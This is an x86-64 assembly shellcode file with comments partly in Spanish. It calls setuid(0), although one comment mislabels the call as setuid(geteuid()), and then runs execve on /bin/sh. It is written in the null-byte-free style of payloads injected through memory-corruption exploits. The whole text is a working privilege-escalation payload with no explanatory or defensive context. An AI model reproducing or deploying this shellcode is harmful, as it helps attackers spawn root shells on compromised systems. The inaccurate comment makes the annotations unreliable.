section .text
    global _start

_start:
    ; --- setuid(geteuid()) ---
    xor     rdi, rdi                ; rdi = 0 (argumento para setuid)
    xor     rax, rax                ; rax = 0
    mov     al, 0x69                ; syscall number for setuid (105)
    syscall                         ; setuid(geteuid())

    ; --- execve("/bin/sh", NULL, NULL) ---
    xor     rax, rax                ; limpiar rax
    mov     al, 0x3b                ; syscall nÃºmero 59 (execve)
    xor     rdi, rdi                ; limpiar rdi
    push    rdi                     ; NULL terminator
    mov     rdi, 0x68732f6e69622f2f ; "//bin/sh"
    push    rdi                     ; push "//bin/sh"
    mov     rdi, rsp                ; rdi -> puntero a "/bin/sh"
    xor     rsi, rsi                ; argv = NULL
    xor     rdx, rdx                ; envp = NULL
    syscall                         ; execve("/bin/sh", NULL, NULL)
